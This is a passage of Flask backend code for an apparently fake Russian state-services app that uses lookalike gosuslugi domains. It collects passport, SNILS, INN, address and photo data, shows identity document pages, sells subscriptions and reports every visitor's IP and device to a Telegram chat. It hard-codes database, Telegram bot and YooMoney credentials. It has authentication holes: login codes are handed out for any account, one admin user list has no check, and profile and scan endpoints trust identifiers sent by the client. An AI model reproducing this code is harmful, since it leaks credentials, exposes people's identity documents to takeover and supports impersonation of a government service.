import hashlib
import os
import random
import time
import zipfile
from datetime import timedelta
from io import BytesIO

import requests
from flask import Flask, render_template, send_from_directory, request, jsonify, session, redirect, send_file
from sqlalchemy import false, and_
from user_agents import parse

from db import db, User, AuthUrl, Profile, Payment, Promocode, UserPromocode, ConsentLog, FakeMessageClose, \
    DocumentScan, ActionLog
from user_agents import parse as parse_ua

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://gen_user:ovLX1T)Hpg-5%3E_@94.198.216.178:5432/default_db'  # Укажите ваш URI для базы данных
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)
app.secret_key = 'GU_GEPOLIS_GUAPPSUPPORT_ADMIN_SECRET_KEY_2'  # Обязательно!
db.init_app(app)
LAST_UA_DATE = "26-05-2025"

with app.app_context():
    db.create_all()  # Создает таблицы в базе данных
import json
from datetime import datetime

def safe_json(data):
    def default(o):
        if isinstance(o, datetime):
            return o.isoformat()
        return str(o)  # fallback
    return json.loads(json.dumps(data, default=default))

def parse_browser(user_agent_string: str) -> str:
    user_agent = parse_ua(user_agent_string)
    return f"{user_agent.browser.family} {user_agent.browser.version_string}"

def parse_os(user_agent_string: str) -> str:
    user_agent = parse_ua(user_agent_string)
    return f"{user_agent.os.family} {user_agent.os.version_string}"

def parse_device(user_agent_string: str) -> str:
    user_agent = parse_ua(user_agent_string)
    if user_agent.is_mobile:
        return "Mobile"
    elif user_agent.is_tablet:
        return "Tablet"
    elif user_agent.is_pc:
        return "PC"
    elif user_agent.is_bot:
        return "Bot"
    return "Unknown"
import requests
def resolve_ip_location(ip: str) -> str:
    if ip.startswith("127.") or ip == "::1" or ip.startswith("192.168."):
        return "Локальная сеть"

    try:
        response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3)

        if response.status_code == 200:
            data = response.json()
            city = data.get('city')
            country = data.get('country_name')
            if city and country:
                return f"{city}, {country}"
            elif country:
                return country
        return "Не удалось определить"
    except Exception as e:
        return "Ошибка"
def resolve_ip_info(ip: str) -> dict:
    try:
        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
        if resp.status_code != 200:
            return {}
        data = resp.json()
        loc = data.get("loc", "").split(",")
        return {
            "city": data.get("city"),
            "region": data.get("region"),
            "country": data.get("country"),
            "provider": data.get("org"),
            "lat": float(loc[0]) if len(loc) == 2 else None,
            "lon": float(loc[1]) if len(loc) == 2 else None
        }
    except:
        return {}
def log_action(
    user_id,
    action_type,
    description,
    user_agent,
    ip,
    cookies,
    mdata=None,
    detail_url=None
):
    # Импортируем user_agents здесь или глобально
    from user_agents import parse as parse_ua
    import requests
    from db import ActionLog
    import datetime

    ua = parse_ua(user_agent)

    # Геолокация по IP
    def resolve_ip_info(ip):
        try:
            resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
            if resp.status_code != 200:
                return {}
            data = resp.json()
            loc = data.get("loc", "").split(",")
            return {
                "city": data.get("city"),
                "region": data.get("region"),
                "country": data.get("country"),
                "provider": data.get("org"),
                "lat": float(loc[0]) if len(loc) == 2 else None,
                "lon": float(loc[1]) if len(loc) == 2 else None
            }
        except:
            return {}

    geo = resolve_ip_info(ip)

    log = ActionLog(
        user_id=user_id,
        session_id=cookies.get('session'),
        action_type=action_type,
        description=description,
        mdata=mdata,
        detail_url=detail_url,
        ip=ip,
        user_agent=user_agent,
        browser=f"{ua.browser.family} {ua.browser.version_string}",
        os=f"{ua.os.family} {ua.os.version_string}",
        device_type=("Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "PC" if ua.is_pc else "Bot" if ua.is_bot else "Unknown"),
        device_brand=ua.device.brand or None,
        device_model=ua.device.model or None,
        language=None,  # Можно добавить, если передать Accept-Language
        screen_resolution=None,
        referer=None,
        origin=None,
        location_city=geo.get('city'),
        location_region=geo.get('region'),
        location_country=geo.get('country'),
        location_lat=geo.get('lat'),
        location_lon=geo.get('lon'),
        location_provider=geo.get('provider'),
        timestamp=datetime.datetime.utcnow()
    )

    db.session.add(log)
    db.session.commit()


def log_action_async(request, user_id, action_type, description, mdata=None, detail_url=None):
    user_agent = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Real-IP', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()
    cookies = request.cookies

    def run_in_context():
        with app.app_context():
            log_action(
                user_id=user_id,
                action_type=action_type,
                description=description,
                user_agent=user_agent,
                ip=ip,
                cookies=cookies,
                mdata=mdata,
                detail_url=detail_url,
            )

    Thread(target=run_in_context, daemon=True).start()
@app.route('/')
def index():
    if not session.get('user_id'):
        return redirect('/auth')
    return send_from_directory('templates', 'test.htm')
def log_user_consent(req,user_id=None, comment="-"):
    client_data = get_client_info(req)
    if not user_id:
        user_id = session.get('user_id')
    if not user_id:
        return
    log = ConsentLog(
        user_id=user_id,
        ip=client_data['network']['ip'],
        user_agent=client_data['network']['user_agent'],
        browser=client_data['device']['browser'],
        system=client_data['device']['os'],
        device=client_data['device']['device'],
        comment_action=comment
    )
    db.session.add(log)
    db.session.commit()


@app.route('/api/documents/scans', methods=['GET'])
def get_scans():
    # Получаем параметры из запроса
    user_id = request.args.get('user_id')
    profile_id = request.args.get('profile_id')

    # Проверяем обязательные параметры
    if not user_id or not profile_id:
        return jsonify({
            'status': 'error',
            'message': 'Требуются параметры user_id и profile_id'
        }), 400

    try:
        # Проверяем существование профиля
        profile = Profile.query.filter_by(
            id=profile_id,
            user_id=user_id
        ).first()

        if not profile:
            return jsonify({
                'status': 'error',
                'message': 'Профиль не найден'
            }), 404

        # Получаем все сканы для профиля
        scans = DocumentScan.query.filter_by(
            profile_id=profile_id,
            is_deleted=False
        ).all()

        # Форматируем результат
        scans_data = []
        for scan in scans:
            scans_data.append({
                'id': scan.id,
                'scan_data': scan.scan_data,
                'uploaded_at': scan.uploaded_at.isoformat()
            })
        return jsonify({
            'status': 'success',
            'scans': scans_data
        })

    except Exception as e:
        app.logger.error(f'Ошибка при получении сканов: {str(e)}')
        return jsonify({
            'status': 'error',
            'message': 'Внутренняя ошибка сервера'
        }), 500


@app.route('/api/documents/upload', methods=['POST'])
def upload_scan():
    try:
        # Получаем данные из запроса
        data = request.json

        # Проверяем обязательные поля
        required_fields = ['user_id', 'profile_id', 'scan_data']
        for field in required_fields:
            if field not in data or not data[field]:
                return jsonify({
                    'status': 'error',
                    'message': f'Отсутствует обязательное поле: {field}'
                }), 400

        user_id = data['user_id']
        profile_id = data['profile_id']
        scan_data = data['scan_data']

        # Проверяем существование профиля
        profile = Profile.query.filter_by(
            id=profile_id,
            user_id=user_id
        ).first()

        if not profile:
            return jsonify({
                'status': 'error',
                'message': 'Профиль не найден'
            }), 404

        # Проверяем формат scan_data
        if not scan_data.startswith('data:image/') and not scan_data.startswith('data:application/pdf'):
            return jsonify({
                'status': 'error',
                'message': 'Неподдерживаемый формат данных. Используйте data URL для изображений или PDF'
            }), 400

        # Создаем новую запись скана
        new_scan = DocumentScan(
            profile_id=profile_id,
            scan_data=scan_data,
            is_deleted=False
        )

        # Сохраняем в базу данных
        db.session.add(new_scan)
        db.session.commit()
        log_action_async(
            request=request,
            user_id=user_id,
            action_type='scan_upload',
            description="Загрузка скана",
            mdata=safe_json({"data": new_scan.to_dict()}),
            detail_url=None
        )
        return jsonify({
            'status': 'success',
            'message': 'Скан успешно загружен',
            'scan_id': new_scan.id
        })

    except Exception as e:
        app.logger.error(f'Ошибка при загрузке скана: {str(e)}')
        return jsonify({
            'status': 'error',
            'message': 'Внутренняя ошибка сервера'
        }), 500
@app.route('/setup/')
def setup():
    if not session.get('user_id'):
        return redirect('/auth')
    return render_template('setup_new.html')

@app.route('/profile/personal/id-doc')
def id_doc():
    if not session.get('user_id'):
        return redirect('/auth')
    return send_from_directory('templates', 'pass_data.htm')


# Конфигурация Telegram бота
TELEGRAM_TOKEN = "7705002195:AAE_9eNFFfaRxhwV54OT-mtm01L5BgXh7V4"
TELEGRAM_CHAT_ID = "-1002557822121"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
CALLBACK_URL = "https://gepolis-gu-7624.twc1.net/callback"

def parse_user_agent(user_agent_str):
    """Анализируем User-Agent для получения детальной информации"""
    if not user_agent_str:
        return {}

    ua = parse(user_agent_str)
    return {
        'browser': f"{ua.browser.family} {ua.browser.version_string}",
        'os': f"{ua.os.family} {ua.os.version_string}",
        'device': f"{ua.device.family}",
        'is_mobile': ua.is_mobile,
        'is_tablet': ua.is_tablet,
        'is_pc': ua.is_pc,
        'is_bot': ua.is_bot
    }


def get_client_info(request):
    """Собираем полную информацию о клиенте"""
    try:
        ip = request.headers.get('X-Real-IP', request.remote_addr)
        if ',' in ip:
            ip = ip.split(',')[0].strip()

        user_agent = request.headers.get('User-Agent')
        ua_info = parse_user_agent(user_agent)

        return {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "network": {
                "ip": ip,
                "user_agent": user_agent,
                "accept_language": request.headers.get('Accept-Language'),
                "referrer": request.headers.get('Referer')
            },
            "device": {
                **ua_info,
                "screen_resolution": request.headers.get('X-Screen-Resolution'),
                "timezone": request.headers.get('X-Timezone'),
                "device_id": request.headers.get('X-Device-ID')
            }
        }
    except Exception as e:
        return {"error": str(e)}



def format_visit_message(client_info, page):
    """Форматируем сообщение о посещении страницы"""
    message = "👀 <b>Новый посетитель на сайте</b>\n\n"
    message += f"📄 <b>Страница:</b> {page}\n\n"

    message += "📱 <b>Информация об устройстве:</b>\n"
    message += f"  • Устройство: {client_info['device'].get('device', '')} "
    message += f"({'Мобильное' if client_info['device'].get('is_mobile') else 'Десктоп'})\n"
    message += f"  • ОС: {client_info['device'].get('os', '')}\n"
    message += f"  • Браузер: {client_info['device'].get('browser', '')}\n"
    if 'screen_resolution' in client_info['device']:
        message += f"  • Разрешение: {client_info['device']['screen_resolution']}\n"
    message += f"  • Часовой пояс: {client_info['device'].get('timezone', '')}\n"
    message += f"  • IP: {client_info['network'].get('ip', '')}\n"
    message += f"  • Язык: {client_info['network'].get('accept_language', '')}\n"
    message += f"  • Реферер: {client_info['network'].get('referrer', 'Прямой заход')}\n"
    message += f"  • Время: {client_info['timestamp']}\n"

    return message


def send_to_telegram(message):
    """Отправляем сообщение в Telegram"""
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(TELEGRAM_API_URL, json=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")
        return False


@app.route("/roadmap")
def roadmap():
    return render_template("roadmap.html")
@app.route("/teams")
def teams():
    return render_template("useragree.html")
from threading import Thread

@app.after_request
def track_visits(response):
    # Игнорируем фавикон и статику
    if all(x not in request.path for x in ["favicon.ico", "static"]):
        uid = session.get('user_id')
        log_action_async(
            user_id=uid,
            action_type="page_visit",
            description=f"Посещение страницы {request.path}",
            request=request,
            mdata={"page": request.path},
            detail_url=request.path,
        )

    # Отправка в телегу тоже лучше в потоке, чтобы не тормозить ответ
    if all(x not in request.path for x in ['api', '6329', 'static']):
        client_info = get_client_info(request)
        message = format_visit_message(client_info, request.path)
        Thread(target=send_to_telegram, args=(message,), daemon=True).start()

    return response


def send_to_telegram(message):
    """Отправляем сообщение в Telegram"""
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(TELEGRAM_API_URL, json=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")
        return False

@app.route("/mobile")
def mobile():
    if not session.get('user_id'):
        return redirect('/auth')
    return render_template("pass.html")

@app.route("/mobile/details")
def mobile_details():
    return render_template("pass_mobile_detail.html")




@app.route('/gen_auth/<int:user_id>/<string:username>')
def gen_auth(user_id, username):
    otp_code = random.randint(100000, 999999)
    au = AuthUrl(code=str(otp_code), user_id=user_id, username=username)

    db.session.add(au)
    db.session.commit()

    user_db_query = User.query.filter_by(user_id=user_id)
    auth = False
    uid = None

    user = user_db_query.first()
    if user:
        auth = True
        uid = user.id

    log_action_async(
        user_id=uid,  # В лог передаем внутренний ID пользователя из базы, если есть
        action_type="code_request",
        description="Запрос кода для входа",
        request=request,
        mdata={"telegram_id": user_id, "user_id": uid, "code": str(otp_code), "registration": not auth},
        detail_url=None,
    )

    return jsonify({'code': otp_code, 'user_id': user_id, "registration": not auth})


@app.route('/check_auth/<int:otp_code>')
def check_auth(otp_code):
    try:
        auth_url = AuthUrl.query.filter(AuthUrl.code==otp_code, AuthUrl.is_active==True).first()
        if auth_url:
            user = User.query.filter(User.user_id==auth_url.user_id).first()

            auth_url.is_active = False
            db.session.commit()
            if user:
                session['user_id'] = user.id
            else:
                user = User(
                    user_id=auth_url.user_id,
                    username=auth_url.username
                )
                db.session.add(user)
                db.session.commit()

            log_user_consent(request, user_id=user.id, comment="Авторизация")
            log_action_async(
                user_id=user.id,  # В лог передаем внутренний ID пользователя из базы, если есть
                action_type="login",
                description="Вход в аккаунт",
                request=request,
                mdata={"code": otp_code, "user_id": user.id, "username": user.username},
                detail_url=None,
            )

            return jsonify({'status': 'success', 'user_id': user.id})
        else:
            log_action_async(
                user_id=None,
                action_type="login_fail",
                description="Неудачная попытка входа",
                request=request,
                mdata={"code": otp_code, "user_id": None, "username": None},
                detail_url=None,
            )
            return jsonify({'status': 'error'})
    except Exception as e:
        send_to_telegram(f"Ошибка проверки авторизации: {e}")
        send_to_telegram(f"Ошибка проверки авторизации: {e.args}")

        return jsonify({'status': 'error'})

@app.route('/auth')
def auth():
    return render_template('auth_new.html')


@app.route('/api/user', methods=['GET'])
def get_or_create_user():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'user_id is required'}), 400

    user = User.query.filter(User.id==user_id).first()
    if not user:
        return jsonify({'error': 'User not found'}), 404

    return jsonify({
        'id': user.id,
        'user_id': user.user_id,
        'username': user.username,
        'is_admin': user.is_admin
    })


@app.route('/api/profiles', methods=['GET'])
def get_profiles():
    start = int(time.time())
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'user_id is required'}), 400
    print("f", int(time.time()) - start)
    # Используем только нужные поля — это мгновенно
    profiles = (
        db.session.query(Profile.id, Profile.name)
        .filter(Profile.user_id == user_id)
        .limit(100)  # Ограничение — на случай большого объема
        .all()
    )
    print("q", int(time.time()) - start)

    if not profiles:
        return jsonify({'error': 'Profiles not found'}), 404

    # Преобразуем напрямую в словарь
    return jsonify([
        {'id': p.id, 'name': p.name} for p in profiles
    ])

@app.route('/api/profile', methods=['GET'])
def get_profile():
    profile_id = request.args.get('profile_id')

    profile = Profile.query.filter(Profile.id==profile_id).first()
    if not profile:
        return jsonify({'error': 'Profile not found'}), 404

    return jsonify(profile.to_dict())


@app.route('/api/profile', methods=['POST'])
def create_profile():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'user_id is required'}), 400

    user = User.query.filter(User.id==user_id).first()
    if not user:
        return jsonify({'error': 'User not found'}), 404

    data = request.get_json()
    name = data.get('name', 'Новый профиль')
    is_primary = data.get('is_primary', False)

    # Проверка на существование основного профиля
    if is_primary:
        primary_profile = Profile.query.filter(Profile.user_id==user.id).first()
        if primary_profile:
            return jsonify({'error': 'Primary profile already exists'}), 400

    new_profile = Profile(
        name=name,
        user_id=user.id,
        is_primary=is_primary,
        photo=data.get('photo'),
        last_name=data.get('last_name'),
        first_name=data.get('first_name'),
        middle_name=data.get('middle_name'),
        birth_date=data.get('birth_date'),
        birth_place=data.get('birth_place'),
        passport_number=data.get('passport_number'),
        passport_issued=data.get('passport_issued'),
        passport_code=data.get('passport_code'),
        passport_date=data.get('passport_date'),
        registration_address=data.get('registration_address'),
        living_address=data.get('living_address'),
        snils_number=data.get('snils_number'),
        inn_number=data.get('inn_number'),
        gender=data.get('gender')
    )
    db.session.add(new_profile)
    db.session.commit()
    log_action_async(
        user_id=user.id,
        action_type="create_profile",
        description="Создание профиля",
        mdata={"profile": new_profile.to_dict(),"user_id": user.id},
        detail_url=None,
        request=request,
    )



    return jsonify(new_profile.to_dict()), 201


@app.route('/api/profile', methods=['PUT'])
def update_profile():
    user_id = session.get('user_id')
    profile_id = request.args.get('profile_id')

    if not user_id:
        return jsonify({'error': 'user_id is required'}), 400

    user = User.query.filter(User.id==user_id).first()
    if not user:
        return jsonify({'error': 'User not found'}), 404

    profile = Profile.query.filter(Profile.id==profile_id, Profile.user_id==user.id).first()
    if not profile:
        return jsonify({'error': 'Profile not found'}), 404
    profile_before = Profile.query.filter(Profile.user_id==user.id).first()
    data = request.get_json()

    if 'name' in data:
        profile.name = data['name']
    if 'is_primary' in data:
        profile.is_primary = data['is_primary']
    if 'last_name' in data:
        profile.last_name = data['last_name']
    if 'first_name' in data:
        profile.first_name = data['first_name']
    if 'middle_name' in data:
        profile.middle_name = data['middle_name']
    if 'birth_date' in data:
        profile.birth_date = data['birth_date']
    if 'birth_place' in data:
        profile.birth_place = data['birth_place']
    if 'passport_number' in data:
        profile.passport_number = data['passport_number']
    if 'passport_issued' in data:
        profile.passport_issued = data['passport_issued']
    if 'passport_code' in data:
        profile.passport_code = data['passport_code']
    if 'passport_date' in data:
        profile.passport_date = data['passport_date']
    if 'registration_address' in data:
        profile.registration_address = data['registration_address']
    if 'living_address' in data:
        profile.living_address = data['living_address']
    if 'snils_number' in data:
        profile.snils_number = data['snils_number']
    if 'inn_number' in data:
        profile.inn_number = data['inn_number']
    if 'photo' in data:
        profile.photo = data['photo']
    if 'gender' in data:
        profile.gender = data['gender']

    db.session.commit()
    log_action_async(
        user_id=user.id,
        action_type="update_profile",
        description="Изменение профиля",
        mdata={"id": profile.id,
               "before": profile_before.to_dict(),
               "after": profile.to_dict(),
               "user_id": user.id,},
        request=request,
    )
    return jsonify(profile.to_dict())


@app.route('/api/profile', methods=['DELETE'])
def delete_profile():
    user_id = session.get('user_id')
    profile_id = request.args.get('profile_id')

    if not user_id:
        return jsonify({'error': 'user_id is required'}), 400

    user = User.query.filter(User.id==user_id).first()
    if not user:
        return jsonify({'error': 'User not found'}), 404

    profile = Profile.query.filter(Profile.id==profile_id, Profile.user_id==user.id).first()
    if not profile:
        return jsonify({'error': 'Profile not found'}), 404

    log_action_async(
        user_id=user.id,
        action_type="delete_profile",
        description="Удаление профиля",
        mdata={"id": profile.id, "data": profile.to_dict(),"user_id": user.id},
        detail_url=None,
        request=request,
    )

    db.session.delete(profile)
    db.session.commit()

    return jsonify({'message': 'Profile deleted successfully'})

@app.route('/demo', methods=['GET'])
def demo():
    return send_from_directory('templates', 'demo_main.htm')

@app.route('/demo/profile', methods=['GET'])
def demo_profile():
    return send_from_directory('templates', 'demo_data.htm')

@app.route('/admin/photos/6329', methods=['GET'])
def admin_photos():
    user_id = session.get('user_id')
    user = User.query.filter(User.id==user_id).first()
    if not user:
        return jsonify({'error': 'User not found'}), 404
    if user.is_admin != True:
        return jsonify({'error': 'Access denied'}), 403
    photos = Profile.query.filter(Profile.photo != None).all()
    html = ""
    for photo in photos:
        html += f"<img src='{photo.photo}' style='width: 200px; height: auto;'>"
    return html


@app.route('/migDomin', methods=['GET'])
def migDomin():
    user_id = session.get('user_id')
    current_active = request.args.get('cap')
    user = User.query.filter(User.id==user_id).first()
    if not user:
        return jsonify({'error': 'User not found'}), 404
    data = f"{user_id}-{current_active}"
    hash = hashlib.md5(data.encode('utf-8')).hexdigest()
    return redirect(f'https://gosuslugi.ru.com/miDominAuth?cap={current_active}&user_id={user_id}&hash={hash}')

@app.route('/miDominAuth', methods=['GET'])
def migDominAuth():
    user_id = session.get('user_id')
    current_active = request.args.get('cap')
    user = User.query.filter(User.id==user_id).first()
    if not user:
        return jsonify({'error': 'User not found'}), 404
    data = f"{user_id}-{current_active}"
    hash = hashlib.md5(data.encode('utf-8')).hexdigest()
    if hash == request.args.get('hash'):
        return render_template("migrate_data.html", user_id=user_id, current_active=current_active)
    else:
        return jsonify({'error': 'Hash not valid'}), 403

@app.route('/admin/json/users', methods=['POST'])
def admin_json_users():
    users = User.query.all()
    return jsonify([{'id': user.id, 'username': user.username, 'user_id': user.user_id, 'is_admin': user.is_admin} for user in users])

@app.route('/static/&lt;path:path&gt;')
def send_static(path):
    return send_from_directory('static', path)

@app.route('/api/verify-pin', methods=['POST'])
def verify_pin():
    pin = request.json.get('pin')
    if pin == '1234':
        return jsonify({'success': True})
    else:
        return jsonify({'success': False})

@app.route("/premium")
def premium():
    return render_template("pay.html")

@app.route("/api/subscription", methods=["GET"])
def get_subscription():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'user_id is required'}), 400

    user = User.query.filter(User.id==user_id).first()
    if not user:
        return jsonify({'error': 'User not found'}), 404
    if user.subscription_expiration is None or user.subscription_type is None:
        user.subscription_type = "N"
        user.subscription_expiration = 0
        db.session.commit()

    if user.subscription_expiration < int(time.time()):
        user.subscription_type = "N"
        user.subscription_expiration = 0
        db.session.commit()

    return jsonify({
        'user_id': user.user_id,
        'username': user.username,
        'plan': user.subscription_type,
        'expires_at': user.subscription_expiration,
        'free_closes': user.free_closes
    })

@app.route("/pinCode")
def pinCode():
    return render_template("code.html")
import uuid

from yoomoney import Quickpay, Client
YOOMONEY_TOKEN = "4100118081125029.B5C5190A0515584D546589668EC04D03BC6680B00269B70913A64220E6657D73ED166EE15820FC4DAA5A15A0A3800E17A9C872A52D07A2D2D43ABDE200C217FE881563B8DC1CC3BE7484958B3FF0EE10B6E5763DDEE322D9D6F45825DA8BA923AE111928DBFE686683BF6C10DC1D4326C0640258434C8D2C89BF885A319CD650"
WALLET_NUMBER = "4100118081125029"  # Номер кошелька (без точки)
@app.route("/payment/<plan>/<t>", methods=['POST', 'GET'])
def payment(plan, t):
    from datetime import datetime
    if request.method == 'POST':
        promo = request.json.get('promo_code')
    else:
        promo = "NONEPROMOCODE"
    print(promo)
    start_time = time.time()
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'Unauthorized: user_id is required'}), 401
    log_user_consent(request,user_id,"Покупка подписки {} {}".format(plan, t))
    payment_uuid = str(uuid.uuid4())
    if plan == "hides":
        print("hides")
        amount = t
        prices = {
            "1": 20,
            "3": 54,
            "5": 80,
            "10": 140,
            "15": 195,
            "20": 250,
            "25": 275,
            "30": 300
        }
        price = prices[amount]
        if request.args.get("test"):
            print("test")
            user = User.query.filter(User.id==user_id).first()
            if user:
                print("user")
                if user.is_admin:
                    print("admin")
                    price = 2
        promo = Promocode.query.filter_by(code=promo, promo_type="discount").first()
        if promo:
            user_id = session.get('user_id')
            price = round(price - (price / 100 * promo.value))
        print("price", price)
        pay = Payment(
            user_id=user_id,
            amount=price,
            plan=plan,
            time=amount,
            status="pending",
            uuid=payment_uuid
        )
        db.session.add(pay)
        db.session.commit()

        print("Saved DB:", time.time() - start_time)
        log_action_async(
            user_id=user_id,
            action_type="create_payment",
            description=f"Создание платежа",
            mdata={"data": pay.to_dict(), "promo": promo},
            detail_url="/payment/url/" + payment_uuid,
            request=request
        )

        # Асинхронно или позже вызывай Quickpay (например, Celery или thread)
        return jsonify({
            "url": "/payment/url/" + payment_uuid,
            "status": "success"
        })




    PLANS = {
        "plus": {"year": 1990, "month": 199, "test": 2},
        "premium": {"year": 4790, "month": 499, "test": 2}
    }

    TIMES = {
        "year": 365 * 86400,
        "month": 30 * 86400,
        "test": 3600
    }

    if plan not in PLANS or t not in PLANS[plan] or t not in TIMES:
        return jsonify({'error': 'Invalid plan or time'}), 400

    price = PLANS[plan][t]
    duration_seconds = TIMES[t]
    promo = Promocode.query.filter_by(code=promo, promo_type="discount").first()
    if promo:
        user_id = session.get('user_id')
        price = round(price - (price / 100 * promo.value))
        print("price", price)
    # Сохраняем платеж
    pay = Payment(
        user_id=user_id,
        amount=price,
        plan=plan,
        time=duration_seconds,
        status="pending",
        uuid=payment_uuid
    )
    db.session.add(pay)
    db.session.commit()

    print("Saved DB:", time.time() - start_time)
    log_action_async(
        user_id=user_id,
        action_type="create_payment",
        description=f"Создание платежа",
        mdata={"data": pay.to_dict(), "promo": promo.to_dict()},
        detail_url="/payment/url/" + payment_uuid,
        request=request
    )

    # Асинхронно или позже вызывай Quickpay (например, Celery или thread)
    return jsonify({
        "url": "/payment/url/" + payment_uuid,
        "status": "success"
    })

@app.route("/api/check-promo", methods=['POST'])
def check_promo():
    promo = request.json.get('promo_code')
    print(promo)
    promo = Promocode.query.filter_by(code=promo, promo_type="discount").first()
    user_id = session.get('user_id')
    if promo is None:
        log_action_async(
            user_id=user_id,
            action_type="promo_use",
            description=f"Попытка использования промокода",
            mdata={"promo": request.json.get('promo_code'), "message": "Промокод не найден", "user_id": user_id},
            detail_url=None,
            request=request
        )

        return jsonify({
            "valid": False,
            "message": "Промокод не найден"
        })
    promo: Promocode = promo
    if promo.user_id:
        if promo.user_id != user_id:
            log_action_async(
                user_id=user_id,
                action_type="promo_use",
                description=f"Попытка использования промокода",
                mdata={"promo": promo.to_dict(), "message": "Промокод другого пользователя", "user_id": user_id},
                detail_url=None,
                request=request
            )
            return jsonify({
                "valid": False,
                "message": "Промокод принадлежит не вам"
            })
    if not promo.discount_multi_use:
        if UserPromocode.query.filter_by(promocode_id=promo.id,user_id=user_id).first():
            log_action_async(
                user_id=user_id,
                action_type="promo_use",
                description=f"Повторное использование промокода",
                mdata={"promo": promo.to_dict(), "message": "Повторное использование промокода", "user_id": user_id},
                detail_url=None,
                request=request
            )
            return jsonify({
                "valid": False,
                "message": "Вы не можете использовать этот промокод повторно"
            })
    if promo.max_uses<=promo.current_uses:
        log_action_async(
            user_id=user_id,
            action_type="promo_use",
            description=f"Лимит использования промокода",
            mdata={"promo": promo.to_dict(), "message": "Лимит использования промокода", "user_id": user_id},
            detail_url=None,
            request=request
        )
        return jsonify({
            "valid": False,
            "message": "Промокод достиг лимита использований"
        })
    print(promo.is_active)
    if not promo.is_active:
        log_action_async(
            user_id=user_id,
            action_type="promo_use",
            description=f"Промокод неактивен",
            mdata={"promo": promo.to_dict(), "message": "Промокод неактивен", "user_id": user_id},
            detail_url=None,
            request=request
        )
        return jsonify({
            "valid": False,
            "message": "Промокод неактивен"
        })
    log_action_async(
        user_id=user_id,
        action_type="promo_use",
        description=f"Использование промокода",
        mdata=safe_json(
            {"promo": promo.to_dict(), "message": "Успешное использование промокода", "user_id": user_id}
        ),
        detail_url=None,
        request=request
    )
    return jsonify({
        "valid": True,
        "discount": promo.value
    })


@app.route("/payment/url/<uuid>")
def get_payment_url(uuid):
    pay = Payment.query.filter_by(uuid=uuid).first()
    user_id = session.get('user_id')
    if not pay:
        return jsonify({'error': 'Payment not found'}), 404

    quickpay = Quickpay(
        receiver=WALLET_NUMBER,
        quickpay_form="shop",
        targets="Sponsor this project",
        paymentType="SB",
        sum=pay.amount,
        label=uuid,
        successURL="https://gosuslugi.com.ru/pay/" + uuid
    )
    log_action_async(
        user_id=user_id,
        action_type="payment_url_open",
        description=f"Открытие ссылки для оплаты",
        mdata={"pay": pay.to_dict(), "user_id": user_id},
        detail_url=None,
        request=request
    )

    return redirect(quickpay.redirected_url)


def check_payment(uuid):
    client = Client(YOOMONEY_TOKEN)
    history = client.operation_history(label=uuid)
    time.sleep(0.2)  # Задержка перед проверкой

    for operation in history.operations:
        if operation.status == 'success':
            pay = Payment.query.filter_by(uuid=uuid).first()
            if not pay or pay.status == "success":
                return {"status": "already_processed"}

            pay.status = "success"
            user = User.query.get(pay.user_id)

            if not user:
                return {"status": "user_not_found"}

            if pay.plan == "hides":
                user.free_closes += pay.time
            else:
                current_time = int(time.time())
                if user.subscription_expiration > current_time:
                    user.subscription_expiration += pay.time
                else:
                    user.subscription_expiration = current_time + pay.time
                user.subscription_type = pay.plan

            db.session.commit()
            return {"status": "success", "redirect": "/premium"}

    return {"status": "pending"}


@app.route("/pay/<uuid>")
def pay(uuid):
    user_id = session.get("user_id")  # внутренний ID пользователя (из users.id)
    action_description = f"Проверка оплаты: UUID={uuid}"

    for attempt in range(3):
        result = check_payment(uuid)
        print(result)

        if result["status"] in ["success", "already_processed"]:
            # Лог успешного платежа
            log_action_async(
                request=request,
                user_id=user_id,
                action_type="payment_check",
                description=f"{action_description} — Успех (попытка {attempt + 1})",
                mdata={"uuid": uuid, "status": result["status"]},
                detail_url=f"/pay/{uuid}"
            )
            return redirect("/premium")

        elif result["status"] == "pending":
            time.sleep(0.1)
            continue

    # Лог неудачи
    log_action_async(
        request=request,
        user_id=user_id,
        action_type="payment_check",
        description=f"{action_description} — Не найден",
        mdata={"uuid": uuid, "status": "not_found"},
        detail_url=f"/pay/{uuid}"
    )

    return jsonify({
        "status": "not_found",
        "message": "Платеж не найден. Попробуйте обновить страницу через несколько минут."
    })

@app.route("/pay/pg/<uuid>")
def paypg(uuid):
    # Проверяем платеж до 3 раз с небольшими задержками
    for _ in range(3):
        result = check_payment(uuid)
        print(result)
        if result["status"] in ["success", "already_processed"]:
            return {"status": "success"}
        elif result["status"] == "pending":
            time.sleep(0.1)
            continue

    return jsonify({
        "status": "not_found"
    })
# ------- PROMOCODE ----------
@app.route("/api/promocode/<code>")
def promocode(code):

    user_id = session.get('user_id')
    if not user_id:
        return jsonify({"status": "error", "message": "Не указан user_id"}), 400

    promocode = Promocode.query.filter(Promocode.code == code).first()
    if not promocode:
        log_action_async(
            user_id=user_id,
            action_type="promo_use",
            description=f"Попытка использования промокода",
            mdata={"promo": code, "message": "Промокод не найден", "user_id": user_id},
            detail_url=None,
            request=request
        )
        return jsonify({"status": "error", "message": "Промокод не найден"}), 400

    if promocode.current_uses >= promocode.max_uses:
        log_action_async(
            user_id=user_id,
            action_type="promo_use",
